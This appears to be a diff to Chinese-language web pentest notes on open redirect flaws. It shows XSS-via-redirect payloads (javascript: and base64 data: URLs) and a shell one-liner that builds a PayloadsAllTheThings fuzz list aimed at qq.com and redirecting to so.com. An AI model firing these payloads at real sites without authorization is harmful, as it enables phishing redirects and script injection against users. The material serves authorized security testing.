@@ -67,14 +67,17 @@ https://famous-website.tld/signup?redirectUrl=https://evil.tld/account
   * XSS from Open URL  `";alert(0);//`
   * XSS from `data://` wrapper   `http://www.aaa.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==`
   * XSS from `javascript://` wrapper  `http://www.aaa.com/redirect.php?url=javascript:prompt(1)`
-* 自动化 - 生成"跳转目的值"字典 进行fuzz 测试任意重定向漏洞 (跳转+XSS)
-  * 进入文件夹`/PayloadsAllTheThings/Open redirect`
-  * 执行命令 生成针对aaa.com的"任意重定向漏洞"fuzz字典 `Open-Redirect-payloads-burp-aaa.com.txt`
+* 自动化测试 - 测试是否存在"任意重定向漏洞" (跳转+XSS)
 
-```
-WHITELISTEDDOMAIN="www.aaa.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
-```
+```shell
+# 步骤1. 下载PayloadsAllTheThings项目
 
+# 步骤2. 执行命令 生成"任意重定向漏洞"payloads
+# 说明: 其中qq.com为正常业务可跳转的白域名 我们的目的是设法跳转到so.com
+cd ~/Downloads/PayloadsAllTheThings/Open\ Redirect/Intruder && WHITELISTEDDOMAIN="qq.com" && sed -e 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' -e 's/google.com/so.com/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
+
+# 步骤3. 发送payloads
+```
 
 **常出现跳转漏洞的功能点**
 ```
